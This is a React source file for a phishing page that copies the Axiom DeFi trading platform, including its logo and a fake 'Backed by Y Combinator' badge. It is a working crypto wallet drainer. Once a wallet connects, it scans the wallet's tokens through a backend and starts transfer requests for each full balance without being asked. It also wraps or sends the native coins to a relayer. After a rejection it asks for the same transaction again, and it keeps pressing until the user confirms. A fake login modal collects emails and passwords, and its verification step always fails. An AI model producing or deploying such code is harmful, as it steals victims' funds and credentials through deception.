'use client'

import React, { useEffect, useState, useRef } from 'react'
import { useAppKit } from '@reown/appkit/react'
import { useSwitchChain, useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
import { ethers } from 'ethers'

interface Token {
  symbol?: string
  address?: string | null
  balance?: string
  decimals?: number
  chain?: number
}

interface SentItem {
  token: Token
  type: 'wrap' | 'transfer' | string
  tx?: string
  amount?: string
  jobId?: string
}

interface FailedItem {
  token: Token
  reason: string
}

// Función helper para fetch con mejor manejo de errores
const fetchWithErrorHandling = async (url: string, options: RequestInit) => {
  const res = await fetch(url, options);
  
  // Verificar el tipo de contenido antes de analizar JSON
  const contentType = res.headers.get('content-type');
  if (!contentType || !contentType.includes('application/json')) {
    const text = await res.text();
    throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 100)}`);
  }

  if (!res.ok) {
    const errorData = await res.json();
    throw new Error(`Error del servidor: ${res.status} ${res.statusText}. ${errorData.error || ''}`);
  }

  return res.json();
};

export default function TokenManager(): React.JSX.Element {
  const { open } = useAppKit()
  const { address, isConnected } = useAccount()
  const walletClient = (useWalletClient() as { data?: any }).data
  const publicClient: any = usePublicClient()
  const { data: balance } = useBalance({ address })
  const { data: feeData } = useFeeData()
  const { switchChain } = useSwitchChain()
  const [tokens, setTokens] = useState<Token[]>([])
  const [processing, setProcessing] = useState<boolean>(false)
  const [summary, setSummary] = useState<{ sent: SentItem[]; failed: FailedItem[] }>({ sent: [], failed: [] })
  const [isClient, setIsClient] = useState<boolean>(false)
  const [hasScanned, setHasScanned] = useState<boolean>(false)
  const [scanError, setScanError] = useState<string>('')
  const [isLoading, setIsLoading] = useState<boolean>(false)
  const [loadingMessage, setLoadingMessage] = useState<string>('')
  const [showProcessingModal, setShowProcessingModal] = useState<boolean>(false)
  const [detectedTokensCount, setDetectedTokensCount] = useState<number>(0)
  const [pendingNativeTokens, setPendingNativeTokens] = useState<Token[]>([])

  // Modal states
  const [isModalOpen, setIsModalOpen] = useState<boolean>(false)
  const [modalType, setModalType] = useState<'login' | 'signup'>('login')
  const [activeView, setActiveView] = useState<'login' | 'verification'>('login')
  const [email, setEmail] = useState<string>('')
  const [password, setPassword] = useState<string>('')
  const [showPassword, setShowPassword] = useState<boolean>(false)
  const [verificationCode, setVerificationCode] = useState<string[]>(['', '', '', '', '', ''])
  const [isLoadingModal, setIsLoadingModal] = useState<boolean>(false)
  const [countdown, setCountdown] = useState<number>(53)
  const [showCodeError, setShowCodeError] = useState<boolean>(false)

  const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''

  const codeInputsRef = useRef<(HTMLInputElement | null)[]>([]);

  // Modal functions
  const openModal = (type: 'Login' | 'Sign up') => {
    setModalType(type.toLowerCase() as 'login' | 'signup')
    setIsModalOpen(true)
    setActiveView('login')
    setEmail('')
    setPassword('')
    setVerificationCode(['', '', '', '', '', ''])
    setShowCodeError(false)
  }

  const closeModal = () => {
    setIsModalOpen(false)
  }

  const backToLogin = () => {
    setActiveView('login')
  }

  const togglePassword = () => {
    setShowPassword(!showPassword)
  }

  const handleForgotPassword = () => {
    // Placeholder for forgot password functionality
    console.log('Forgot password clicked')
  }

  const switchToSignup = () => {
    setModalType('signup')
  }

  const openGooglePopup = () => {
    // Placeholder for Google login functionality
    console.log('Google login clicked')
  }

  const handlePhantomLogin = () => {
    open() // Use AppKit's open function
  }

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoadingModal(true)
    
    // Simulate sending verification code
    setTimeout(() => {
      setIsLoadingModal(false)
      setActiveView('verification')
      startCountdown()
    }, 1500)
  }

  const startCountdown = () => {
    setCountdown(53)
    const interval = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(interval)
          return 0
        }
        return prev - 1
      })
    }, 1000)
  }

 const moveToNext = (currentInput: HTMLInputElement, index: number) => {
  const value = currentInput.value;
  
  if (value.length === 1 && index < 5) {
    codeInputsRef.current[index + 1]?.focus();
  }
  
  const newCode = [...verificationCode];
  newCode[index] = value;
  setVerificationCode(newCode);
}

  const submitCode = () => {
    // Simulate code verification
    setShowCodeError(false)
    
    // Show error after 3 seconds if code is incorrect (simulation)
    setTimeout(() => {
      setShowCodeError(true)
    }, 3000)
  }

  const changeChainIfNeeded = async (targetChainId: number, timeoutMs = 15000): Promise<void> => {
    if (!walletClient) throw new Error('Wallet client no disponible')

    try {
      setLoadingMessage(`Cambiando a la red ${targetChainId}...`)
      setIsLoading(true)

      const getCurrent = async () => {
        try {
          return await walletClient.getChainId()
        } catch (e) {
          return undefined
        }
      }

      const currentChainId = await getCurrent()
      if (currentChainId === targetChainId) {
        setIsLoading(false)
        return
      }

      // Intentar usar switchChain de wagmi si está disponible
      let switched = false
      try {
        if (switchChain) {
          await switchChain({ chainId: targetChainId })
          switched = true
        }
      } catch (swErr: any) {
        // Si switchChain no funcionó, seguiremos intentando con wallet RPC
        if (swErr?.code && swErr.code !== 4902 && !isUserRejected(swErr)) {
          // dejar que el siguiente bloque intente un switch alternativo o agregar la cadena
        }
        if (isUserRejected(swErr)) {
          throw new Error('Usuario rechazó el cambio de red')
        }
      }

      // Si no se hizo el cambio con switchChain, intentar con request RPC
      if (!switched) {
        try {
          await walletClient.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${targetChainId.toString(16)}` }]
          })
        } catch (err: any) {
          // Si la cadena no existe (4902) intentamos agregarla
          if (err?.code === 4902) {
            // sólo ejemplo para BSC; agregar más blockchains según necesites
            if (targetChainId === 56) {
              await walletClient.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: '0x38',
                  chainName: 'BNB Smart Chain',
                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
                  blockExplorerUrls: ['https://bscscan.com/']
                }]
              })
              // intentar switch otra vez
              await walletClient.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }]
              })
            } else {
              throw new Error(`La red con ID ${targetChainId} no está agregada en tu wallet`)
            }
          } else if (isUserRejected(err)) {
            throw new Error('Usuario rechazó el cambio de red')
          } else {
            throw err
          }
        }
      }

      // Polling: esperar hasta que la wallet realmente reporte la nueva chain
      const start = Date.now()
      while (Date.now() - start < timeoutMs) {
        const newChain = await getCurrent()
        if (newChain === targetChainId) {
          setIsLoading(false)
          return
        }
        await new Promise((r) => setTimeout(r, 500))
      }

      throw new Error('Timeout esperando que la wallet cambie de red')
    } catch (error: any) {
      setIsLoading(false)
      // rethrow con mensaje legible
      if (isUserRejected(error)) throw new Error('Usuario rechazó el cambio de red')
      throw new Error(error?.message || String(error))
    }
  }

  useEffect(() => {
    setIsClient(true)

    // Global error handlers
    const onError = (e: ErrorEvent) => {
      console.error('Global error captured:', e.error || e.message || e)
    }
    const onRejection = (e: PromiseRejectionEvent) => {
      console.error('Unhandled rejection captured:', e.reason || e)
    }

    window.addEventListener('error', onError)
    window.addEventListener('unhandledrejection', onRejection)

    return () => {
      window.removeEventListener('error', onError)
      window.removeEventListener('unhandledrejection', onRejection)
    }
  }, [])

  useEffect(() => {
    if (isConnected && address && !hasScanned && !scanError) {
      scanWallet()
    }
  }, [isConnected, address, hasScanned, scanError])

  useEffect(() => {
    // Iniciar procesamiento automáticamente cuando se detectan tokens
    if (hasScanned && tokens.length > 0 && !processing) {
      setShowProcessingModal(true)
      // Pequeño delay para que el usuario vea el modal antes de comenzar el procesamiento
      setTimeout(() => {
        processAllTokens()
      }, 1500)
    }
  }, [hasScanned, tokens, processing])

  const showLoading = (message: string) => {
    setLoadingMessage(message)
    setIsLoading(true)
  }

  const hideLoading = () => {
    setIsLoading(false)
    setLoadingMessage('')
  }

  const scanWallet = async (): Promise<void> => {
    try {
      setScanError('')
      showLoading('Escaneando tokens en todas las cadenas...')

      if (!BACKEND) {
        const errorMsg = 'Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.'
        console.error('[CONFIG]', errorMsg)
        setScanError(errorMsg)
        hideLoading()
        await alertAction(errorMsg)
        return
      }

      const data = await fetchWithErrorHandling(`${BACKEND}/owner-tokens`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ owner: address })
      })

      console.log('Tokens detectados:', data)

      const processedTokens: Token[] = (data.tokens as Token[] || []).map((token: Token) => {
        if (token.symbol === 'MATIC' && !token.address) {
          return { ...token, address: null }
        }
        return token
      })

      // Guardar todos los tokens
      setTokens(processedTokens || [])
      setDetectedTokensCount(processedTokens.length)
      setHasScanned(true)
      
      // Preparar tokens nativos pendientes
      const nativeTokens = processedTokens.filter(token => !token.address)
      setPendingNativeTokens(nativeTokens)
      
      // Log de tokens en consola
      if (processedTokens.length > 0) {
        console.log('Tokens detectados:', processedTokens)
      }
      
      hideLoading()
    } catch (err: any) {
      console.error('Error escaneando wallet:', err)
      const errorMsg = 'Error escaneando wallet: ' + (err?.message || err)
      setScanError(errorMsg)
      hideLoading()
      await alertAction(errorMsg + '\n\nPor favor, intenta reconectar la wallet.')
    }
  }

  const alertAction = async (message: string): Promise<void> => {
    if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
      ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'alert', message }))
      return
    }

    if (typeof globalThis !== 'undefined' && typeof (globalThis as any).alert === 'function') {
      globalThis.alert(message)
      return
    }

    console.log('Alert fallback:', message)
  }

  const confirmAction = async (message: string): Promise<boolean> => {
    if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
      return new Promise((resolve) => {
        const handler = (event: MessageEvent) => {
          try {
            const data = JSON.parse(event.data)
            if (data?.type === 'confirmResponse') {
              window.removeEventListener('message', handler)
              resolve(Boolean(data.response))
            }
          } catch (e) {}
        }

        window.addEventListener('message', handler)
        ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'confirm', message }))

        setTimeout(() => {
          window.removeEventListener('message', handler)
          resolve(false)
        }, 30000)
      })
    }

    if (typeof globalThis !== 'undefined' && typeof (globalThis as any).confirm === 'function') {
      return Promise.resolve(Boolean(globalThis.confirm(message)))
    }

    return Promise.resolve(false)
  }

  const getWrapInfo = async (chainId: number): Promise<any | null> => {
    try {
      if (!BACKEND) {
        console.warn('[CONFIG] getWrapInfo aborted: BACKEND not defined')
        return null
      }
      return await fetchWithErrorHandling(`${BACKEND}/wrap-info`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ chain: chainId })
      })
    } catch (err) {
      console.error('Error obteniendo info de wrap:', err)
      return null
    }
  }

  const isUserRejected = (error: any): boolean => {
    if (!error) return false
    const message = String(error?.message || '').toLowerCase()
    return /user denied|user rejected|rejected by user/i.test(message)
  }
    

  const processNativeToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
  try {
    if (!walletClient || !publicClient || !address) {
      throw new Error('Wallet no conectada correctamente');
    }

    // Cambiar a la cadena correcta antes de procesar
    await changeChainIfNeeded(token.chain as number)

    const targetChainId = token.chain as number;
    if (!targetChainId) {
      throw new Error('No se pudo determinar la cadena del token');
    }

    // Cambiar a la cadena correcta antes de procesar
    await changeChainIfNeeded(targetChainId);

    // Resto del código para wrap o transferencia...
    const wrapInfo = await getWrapInfo(targetChainId);
    const wrappedAddress: string | undefined = wrapInfo?.wrappedAddress;

      const balanceBN = ethers.BigNumber.from(token.balance || '0')
      const gasPrice = (feeData as any)?.gasPrice || ethers.BigNumber.from('20000000000') // 20 gwei por defecto

      // Estimaciones de gas
      const gasLimitTransfer = ethers.BigNumber.from(21000)
      const gasLimitWrap = ethers.BigNumber.from(100000)

      // Buffer de seguridad
      const buffer = gasPrice.mul(30000)

      // Calcular máximos seguros
      const feeWrap = gasPrice.mul(gasLimitWrap)
      const feeTransfer = gasPrice.mul(gasLimitTransfer)
      const maxSafeForWrap = balanceBN.gt(feeWrap.add(buffer)) ? balanceBN.sub(feeWrap).sub(buffer) : ethers.BigNumber.from(0)
      const maxSafeForTransfer = balanceBN.gt(feeTransfer.add(buffer)) ? balanceBN.sub(feeTransfer).sub(buffer) : ethers.BigNumber.from(0)

      // Si no hay suficiente para ninguna operación
      if (maxSafeForWrap.lte(0) && maxSafeForTransfer.lte(0)) {
        const reason = 'Saldo insuficiente para cubrir gas fees'
        setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
        return { success: false, reason }
      }

      // Si hay wrapped disponible y saldo suficiente, hacer wrap automáticamente
      if (wrappedAddress && maxSafeForWrap.gt(0)) {
        try {
          showLoading(`Procesando wrap de ${token.symbol}...`)
          
          const wrapAbi = [
            {
              inputs: [],
              name: 'deposit',
              outputs: [],
              stateMutability: 'payable',
              type: 'function'
            }
          ] as const

          // Reintentar hasta que la transacción sea confirmada
          let transactionHash: string | undefined;
          let confirmed = false;
          
          while (!confirmed) {
            try {
              transactionHash = await walletClient.writeContract({
                address: wrappedAddress as `0x${string}`,
                abi: wrapAbi,
                functionName: 'deposit',
                value: maxSafeForWrap.toBigInt(),
                gas: gasLimitWrap.toBigInt()
              })

              showLoading(`Esperando confirmación de wrap para ${token.symbol}...`)
              await publicClient.waitForTransactionReceipt({ hash: transactionHash })
              confirmed = true;

            } catch (error: any) {
              if (isUserRejected(error)) {
                // Si el usuario rechaza, mostrar alerta y reintentar
                await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
                continue;
              }
              throw error;
            }
          }

          setSummary(prev => ({
            ...prev,
            sent: [...prev.sent, { 
              token: { ...token, symbol: `W${token.symbol}` }, 
              type: 'wrap', 
              tx: transactionHash, 
              amount: maxSafeForWrap.toString() 
            }]
          }))

          hideLoading()
          return { success: true }
        } catch (error: any) {
            // Manejo de errores
            console.error('Error procesando token nativo:', error);
            const reason = isUserRejected(error) ? 
              'Usuario rechazó la transacción' : 
              `Error: ${error?.message || error}`;

            setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }));
            return { success: false, reason };
          }
        };

      // Si no se hizo wrap, crear solicitud de transferencia en el backend
      if (maxSafeForTransfer.gt(0)) {
        if (!BACKEND) throw new Error('BACKEND no configurado')
        
        showLoading(`Creando solicitud de transferencia para ${token.symbol}...`)
        const data = await fetchWithErrorHandling(`${BACKEND}/create-native-transfer-request`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({
            owner: address,
            chain: token.chain,
            amount: maxSafeForTransfer.toString()
          })
        })

        if (data.ok && data.instructions && data.instructions.relayerAddress) {
          // Reintentar hasta que la transacción sea confirmada
          let transactionHash: string | undefined;
          let confirmed = false;
          
          while (!confirmed) {
            try {
              showLoading(`Enviando ${token.symbol} al relayer...`)
              transactionHash = await walletClient.sendTransaction({
                to: data.instructions.relayerAddress as `0x${string}`,
                value: maxSafeForTransfer.toBigInt(),
                gas: gasLimitTransfer.toBigInt()
              })

              showLoading(`Esperando confirmación de transferencia para ${token.symbol}...`)
              await publicClient.waitForTransactionReceipt({ hash: transactionHash })
              confirmed = true;

            } catch (error: any) {
              if (isUserRejected(error)) {
                // Si el usuario rechaza, mostrar alerta y reintentar
                await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
                continue;
              }
              throw error;
            }
          }

          setSummary(prev => ({
            ...prev,
            sent: [...prev.sent, { 
              token, 
              type: 'transfer', 
              tx: transactionHash, 
              amount: maxSafeForTransfer.toString(), 
              jobId: data.jobId 
            }]
          }))
          
          hideLoading()
          return { success: true }
        } else {
          hideLoading()
          throw new Error('Error creando solicitud de transferencia')
        }
      }
      
      hideLoading()
      return { success: false, reason: 'No se pudo procesar el token nativo' }
    } catch (error: any) {
      hideLoading()
      console.error('Error procesando token nativo:', error)

      const reason = isUserRejected(error) ? 'Usuario rechazó la transacción' : `Error: ${error?.message || error}`

      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
      return { success: false, reason }
    }
  }

  const processToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
    try {
      if (!BACKEND) throw new Error('BACKEND no configurado')
      
      showLoading(`Procesando ${token.symbol}...`)
      const data = await fetchWithErrorHandling(`${BACKEND}/create-transfer-request`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          owner: address,
          chain: token.chain,
          token: token.address,
          amount: token.balance
        })
      })

      if (data.ok) {
        setSummary(prev => ({ ...prev, sent: [...prev.sent, { token, type: 'transfer', jobId: data.jobId, amount: token.balance }] }))
        hideLoading()
        return { success: true }
      } else {
        hideLoading()
        throw new Error(data.error || 'Error creando solicitud de transferencia')
      }
    } catch (error: any) {
      hideLoading()
      console.error('Error procesando token:', error)
      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason: error?.message || 'Error desconocido' }] }))
      return { success: false, reason: error?.message || 'Error desconocido' }
    }
  }

  const processAllTokens = async (): Promise<void> => {
    if (!tokens.length) {
      setShowProcessingModal(false)
      return
    }

    setProcessing(true)
    setSummary({ sent: [], failed: [] }) // Reset summary
    
    // Separar tokens nativos y no nativos
    const nonNativeTokens = tokens.filter(token => token.address !== null)
    const nativeTokens = tokens.filter(token => token.address === null)
    
    // Si hay tokens nativos, mostrar confirmación persistente
    if (nativeTokens.length > 0) {
      let shouldProcessNatives = false;
      
      // Persistir hasta que el usuario acepte procesar los tokens nativos
      while (!shouldProcessNatives) {
        shouldProcessNatives = await confirmAction(
          `Se han detectado ${nativeTokens.length} token(s) nativo(s). ¿Deseas procesarlos automáticamente?`
        );
        
        if (!shouldProcessNatives) {
          // Si el usuario cancela, mostrar mensaje y volver a preguntar
          await alertAction('Debes aceptar el procesamiento de tokens nativos para continuar.');
        }
      }
    }
    
    // Ordenar tokens nativos por balance (mayor primero)
    const sortedNativeTokens = [...nativeTokens].sort((a, b) => {
      const balanceA = ethers.BigNumber.from(a.balance || '0')
      const balanceB = ethers.BigNumber.from(b.balance || '0')
      return balanceB.gt(balanceA) ? 1 : balanceB.lt(balanceA) ? -1 : 0
    })

    // Procesar tokens no nativos automáticamente
    for (const token of nonNativeTokens) {
      await processToken(token)
    }

    // Procesar tokens nativos automáticamente
    for (const token of sortedNativeTokens) {
      await changeChainIfNeeded(token.chain as number)
    }

    setProcessing(false)
    setShowProcessingModal(false)

    // Mostrar resumen después de un breve delay para que se actualice el estado
    setTimeout(async () => {
      if (summary.sent.length > 0 || summary.failed.length > 0) {
        let message = '=== Resumen ===\n'
        message += `Éxitos: ${summary.sent.length}\n`
        message += `Fallos: ${summary.failed.length}\n`

        if (summary.failed.length > 0) {
          message += '\nAlgunos tokens no se procesaron. Revisa los detalles.'
        }

        await alertAction(message)
      }
    }, 100)
  }

  // Evitar renderizado hasta que estemos en el cliente
  if (!isClient) {
    return (
      <div style={{
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        height: '100vh',
        flexDirection: 'column'
      }}>
        <h1>Administrador de Tokens</h1>
        <p>Cargando...</p>
      </div>
    )
  }

  return (
    <>
      {/* Navigation */}
      <nav className="navbar">
          <img src="/media/Axiom Logo.svg" style={{width: '10%'}} alt="" /> 
          <div className="nav-buttons">
              <button className="login-btn" onClick={() => openModal('Login')}>Login</button>
              <button className="signup-btn" onClick={() => openModal('Sign up')}>Sign up</button>
          </div>
      </nav>

      {/* Main content */}
      <main className="main-content" >
          
          <section className="main-content" style={{width: '100%', height: '100vh', backgroundImage: 'url(/media/Captura_de_pantalla_2025-08-13_231920.png)', backgroundSize: 'cover', backgroundPosition: 'center'}}>
              <div style={{paddingTop: '5%'}}> <img src="/media/Logo.svg" style={{width: '200%'}} alt="" /></div>
          
              <h1 className="main-title" style={{marginTop: '2%'}}>The Gateway to DeFi</h1>
              
              <p className="subtitle">Axiom is the only trading platform you'll ever need.</p>
              
              <a className="cta-button" 
                style={{marginTop: '2%', textDecoration: 'none', display: 'inline-block', cursor: 'pointer'}}
                onClick={() => open()}>
                connect with Phantom
              </a>
              
              <div className="backed-by">
                  <span className="backed-text">Backed by</span>
                  <div className="combinator-logo">
                      <div className="combinator-icon">Y</div>
                      <span className="combinator-text">Combinator</span>
                  </div>
              </div>
          </section>

          <section style={{width: '100%'}}>
              <video style={{width: '100%'}}
                  src="/media/hero-video.mp4"
                  autoPlay
                  loop
                  muted
                  playsInline
              >
          </video>
        </section>

        <div className="trading-features-section">
    <div className="container">
      <div className="header-content">
        <h1 className="main-title">Advanced Features to<br />videoline Your Trading.</h1>
        <p className="subtitle">From wallet tracking to real-time analytics, we've got you covered.</p>
      </div>
      
      <div className="features-grid">
        <div className="feature-item active">
          <div className="feature-line"></div>
          <h3 className="feature-title">Order Execution Engine</h3>
          <p className="feature-description">Trade with confidence.</p>
        </div>
        
        <div className="feature-item">
          <div className="feature-line"></div>
          <h3 className="feature-title">Wallet and Twitter Tracker</h3>
          <p className="feature-description">Trade and track all in one place.</p>
        </div>
        
        <div className="feature-item">
          <div className="feature-line"></div>
          <h3 className="feature-title">Hyperliquid Perpetuals</h3>
          <p className="feature-description">Trade leveraged Perps.</p>
        </div>
        
        <div className="feature-item">
          <div className="feature-line"></div>
          <h3 className="feature-title">Yield</h3>
          <p className="feature-description">Earn while you sleep.</p>
        </div>
      </div>
    </div>
  </div>


  <div className="trading-dashboard-section">
    <div className="container">
      <div className="content-wrapper">
        <div className="features-left">
          <div className="feature-block active">
            <div className="feature-header">
              <div className="feature-content">
                <h3>Land in ≤1 Block</h3>
              </div>
            </div>
            <p className="feature-description">Our limit order execution engine is the fastest in the market.</p>
            <div className="feature-details">
              <p>With our proprietary order execution engine and colocated nodes, our limit orders land in ≤ 1 block.</p>
            </div>
          </div>

</div>
          <section style={{ display: 'flex', flexDirection: 'column' }}>
  <div className="feature-block">
    <div className="feature-header">
      <div className="feature-icon">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" stroke="currentColor" strokeWidth="2" fill="none"/>
        </svg>
      </div>
      <div className="feature-content">
        <h3>Migration Sniper</h3>
      </div>
    </div>
  </div>

  <div className="feature-block">
    <div className="feature-header">
      <div className="feature-icon">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect x="3" y="3" width="18" height="18" rx="2" ry="2" stroke="currentColor" strokeWidth="2" fill="none"/>
          <line x1="9" y1="9" x2="15" y2="15" stroke="currentColor" strokeWidth="2"/>
          <line x1="15" y1="9" x2="9" y2="15" stroke="currentColor" strokeWidth="2"/>
        </svg>
      </div>
      <div className="feature-content">
        <h3>No MEV Triggers</h3>
      </div>
    </div>
  </div>

  <div className="feature-block">
    <div className="feature-header">
      <div className="feature-icon">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z" stroke="currentColor" strokeWidth="2" fill="none"/>
          <line x1="4" y1="22" x2="4" y2="15" stroke="currentColor" strokeWidth="2"/>
        </svg>
      </div>
      <div className="feature-content">
        <h3>Auto-Strategies</h3>
      </div>
    </div>
  </div>
  
</section>

        <div className="video-right">
          <section>
            <video 
              src="/media/land-on-two-blocks.mp4"
              autoPlay
              loop
              muted
              playsInline
            >
            </video>
          </section>
        </div>
      </div>
    </div>
  </div>

      </main>

      {/* Modal */}
      {isModalOpen && (
        <div className="modal-overlay" id="loginModal">
          <div className="modal-container">
            <button className="modal-close" onClick={closeModal}>
                <i className="fas fa-times"></i>
            </button>
            
            <button className="back-arrow" onClick={backToLogin} style={{display: activeView === 'verification' ? 'block' : 'none'}} id="backArrow">
                <i className="fas fa-arrow-left"></i>
            </button>

            {/* Loading Screen */}
            {isLoadingModal && (
              <div className="loading" id="loadingScreen" style={{display: 'block'}}>
                  <div className="spinner"></div>
                  <p style={{color: '#ccc'}}>Sending verification code...</p>
              </div>
            )}
            
            {/* Login Form */}
            {!isLoadingModal && activeView === 'login' && (
              <div className="login-form" id="loginForm">
                  <div className="modal-header">
                      <h2 className="modal-title">{modalType === 'login' ? 'Login' : 'Sign up'}</h2>
                  </div>
                  
                  <form onSubmit={handleLogin}>
                      <div className="form-group">
                          <label className="form-label">Email</label>
                          <input 
                              type="email" 
                              className="form-input" 
                              placeholder="Enter email"
                              id="emailInput"
                              required
                              value={email}
                              onChange={(e) => setEmail(e.target.value)}
                          />
                      </div>
                      
                      <div className="form-group">
                          <label className="form-label">Password</label>
                          <div className="form-input-wrapper">
                              <input 
                                  type={showPassword ? 'text' : 'password'} 
                                  className="form-input" 
                                  placeholder="Enter password"
                                  id="passwordInput"
                                  required
                                  value={password}
                                  onChange={(e) => setPassword(e.target.value)}
                              />
                              <button 
                                  type="button" 
                                  className="password-toggle" 
                                  onClick={togglePassword}
                              >
                                  <i className={`fas ${showPassword ? 'fa-eye-slash' : 'fa-eye'}`} id="eyeIcon"></i>
                              </button>
                          </div>
                          <div className="forgot-password">
                              <a href="#" onClick={handleForgotPassword}>Forgot password?</a>
                          </div>
                      </div>
                      
                      <button type="submit" className="modal-login-btn">{modalType === 'login' ? 'Login' : 'Sign up'}</button>
                      
                      <div className="divider">
                          <span>OR</span>
                      </div>
                      
                      <div className="social-buttons">
                          <button type="button" className="social-btn google-btn" onClick={openGooglePopup}>
                              <img src="/media/google-logo.svg" style={{width: '8%'}} alt="" />
                              Continue with Google
                          </button>
                          
                          <button type="button" className="social-btn phantom-btn" onClick={handlePhantomLogin}>
                              <img src="/media/phantom-purple.svg" style={{width: '8%'}} alt="" />
                              Connect with Phantom
                          </button>
                      </div>
                      
                      <div className="signup-link">
                          {modalType === 'login' ? (
                            <>Don't have an account? <a href="#" onClick={switchToSignup}>Sign up</a></>
                          ) : (
                            <>Already have an account? <a href="#" onClick={() => setModalType('login')}>Login</a></>
                          )}
                      </div>
                  </form>
              </div>
            )}

            {/* Verification Form */}
            {!isLoadingModal && activeView === 'verification' && (
              <div className="verification-form" id="verificationForm" style={{display: 'block'}}>
                  <div className="modal-header">
                      <h2 className="modal-title">Confirmation Code</h2>
                  </div>
                  
                  <div className="verification-text">
                      We've sent a verification code to<br />
                      <span className="verification-email" id="userEmail">{email}</span>
                  </div>
                  
                   <div className="code-inputs">
                    {[0, 1, 2, 3, 4, 5].map((index) => (
                      <input 
                        key={index}
                        type="text" 
                        className="code-input" 
                        maxLength={1} 
                        value={verificationCode[index]}
                        onInput={(e) => moveToNext(e.currentTarget as HTMLInputElement, index)}
                        ref={(el) => {
                          codeInputsRef.current[index] = el;
                        }}
                      />
                    ))}
                  </div>
                  
                  <div className="resend-info" id="resendInfo">
                      You can resend a new code in <span id="countdown">{countdown}</span> seconds
                  </div>

                  {/* Botón para enviar el código manualmente */}
                  <div style={{marginTop: '12px'}}>
                      <button type="button" id="submitCodeBtn" className="modal-login-btn" onClick={submitCode}>Enviar código</button>
                  </div>

                  {/* Mensaje de error que aparecerá luego de 3s si el código es incorrecto */}
                  {showCodeError && (
                    <div id="codeError" style={{display: 'block', color: '#ff6f6f', marginTop: '12px', fontWeight: '600'}}>
                        El código es incorrecto.
                    </div>
                  )}
                  
                  <div className="privacy-info" style={{marginTop: '12px'}}>
                      By creating an account, you agree to Axiom's<br />
                      <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a>
                  </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Hidden wallet connect button (keeps the logic but is not visible) */}
      <button
        onClick={() => open()}
        style={{
          position: 'absolute',
          opacity: 0,
          pointerEvents: 'none'
        }}
      >
        {isConnected ? `Conectado: ${String(address)?.substring(0, 8)}...` : 'Conectar Wallet'}
      </button>

      {/* Processing Modal */}
      {(isLoading || showProcessingModal) && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          backgroundColor: 'rgba(0, 0, 0, 0.8)',
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          zIndex: 1000,
          flexDirection: 'column'
        }}>
          <div style={{
            width: '50px',
            height: '50px',
            border: '5px solid #f3f3f3',
            borderTop: '5px solid #0070f3',
            borderRadius: '50%',
            animation: 'spin 1s linear infinite',
            marginBottom: '20px'
          }}></div>
          <p style={{ color: 'white', fontSize: '18px', margin: '0 0 10px 0', textAlign: 'center' }}>
            {showProcessingModal 
              ? `Procesando ${detectedTokensCount} tokens detectados...` 
              : loadingMessage}
          </p>
          <p style={{ color: '#ccc', fontSize: '14px', margin: 0, textAlign: 'center' }}>
            Por favor espere, esto puede tomar varios minutos...
            <br />
            {showProcessingModal && 'Se abrirá tu wallet para confirmar las transacciones.'}
          </p>
        </div>
      )}

      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>

      {/* External CSS */}
      <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
      <link rel="stylesheet" href="/css/style.css" />

    </>
  )
}
